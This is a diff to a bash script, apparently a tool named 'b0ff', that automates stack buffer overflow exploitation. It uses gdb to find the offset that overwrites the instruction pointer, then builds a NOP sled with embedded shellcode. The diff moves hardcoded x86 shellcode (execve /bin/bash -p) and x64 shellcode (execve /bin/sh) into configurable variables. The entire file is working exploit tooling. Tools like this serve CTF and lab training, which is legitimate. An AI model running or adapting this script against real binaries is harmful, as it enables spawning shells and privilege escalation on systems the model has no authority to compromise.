@@ -4,9 +4,9 @@
 
 function help(){
 
-	printf "Usage bash $0 <binary> <buffer> <arch>\n"
-	printf "Examples:  bash $0 ./bin 600 x86\n"
-	printf "           bash $0 ./bin 1000 x64\n"
+	printf "Usage bash b0ff <binary> <buffer> <arch>\n"
+	printf "Examples:  bash b0ff ./bin 600 x86\n"
+	printf "           bash b0ff ./bin 1000 x64\n"
 	exit
 
 }
@@ -21,25 +21,32 @@ COL_GREEN="\e[0;32m"
 COL_END="\e[0m"
 
 binary="$1"
-start=0
+start=1
 end="$2"
+
+# Change shellcodex86 and shellcodex64 variable values for your shellcode, defaults values are the following
+# source https://shell-storm.org/shellcode/index.html
+# Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes by Jonathan Salwan
+shellcodex86="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+# Linux x64 Execute /bin/sh - 27 bytes by Dad` <3 baboon
+shellcodex64="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
 function x86(){
 
 	for ((i=$start;i<=$end;i++))
 	do
-	
+		
 		if [[ $(echo run $(python -c "print('A'*$i)") | gdb $binary | grep '0x41414141 in ?? ()') == "0x41414141 in ?? ()" ]]
 		then
 
-			shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+			shellcode=$shellcodex86
 			p_len=$(printf $shellcode | wc -c)
 			offset=$(($i-4-$p_len))
 			printf "[${COL_GREEN}SHELLCODE${COL_END}] "
 			echo $shellcode | tr -s '\\' '\\\\'
 			printf "[${COL_GREEN}SHELLCODE SIZE${COL_END}] $p_len\n"
 			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"
-			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*4)')" -ex 'i r' -ex 'x/'$end'wx $esp' $binary --batch | grep '0x90909090' > /tmp/memories
+			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*4)')" -ex 'x/'$end'wx $esp' $binary --batch | grep '0x90909090' > /tmp/memories
 			# 13p can fail due address loc, needs to be a variable
 			mem=$(sed -n '13p' /tmp/memories | awk '{print $1}' | sed -e 's/0x/\\x/g' | tr -d ':' | sed 's/.\{2\}/&\\x/g' | sed -e 's/..$//g' | sed -e 's/^..//g')
 			address=$(echo ${mem:12:4}${mem:8:4}${mem:4:4}${mem:0:4})
@@ -64,14 +71,14 @@ function x64(){
 		if [[ $(echo run $(python -c "print('A'*$i)") | gdb $binary | grep '0x0000414141414141 in ?? ()') == "0x0000414141414141 in ?? ()" ]]
 		then
 
-			shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+			shellcode=$shellcodex64
 			p_len=$(printf $shellcode | wc -c)
 			offset=$(($i-6-$p_len))
 			printf "[${COL_GREEN}SHELLCODE${COL_END}] "
 			echo $shellcode | tr -s '\\' '\\\\'
 			printf "[${COL_GREEN}SHELLCODE SIZE${COL_END}] $p_len\n"
 			printf "[${COL_GREEN}OFFSET${COL_END}] $offset\n"
-			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*6)')" -ex 'i r' -ex 'x/'$end'wx $rsp' $binary --batch | grep '0x90909090' > /tmp/memories
+			gdb -ex 'set pagination off' -ex "run $(python2 -c 'print("\x90"*'$offset' + "'$shellcode'" + "B"*6)')" -ex 'x/'$end'wx $rsp' $binary --batch | grep '0x90909090' > /tmp/memories
 
 			# 11p can fail due address loc, needs to be a variable
 			mem=$(sed -n '11p' /tmp/memories | awk '{print $1}' | sed -e 's/0x/\\x/g' | tr -d ':' | sed 's/.\{2\}/&\\x/g' | sed -e 's/..$//g' | sed -e 's/^..//g')
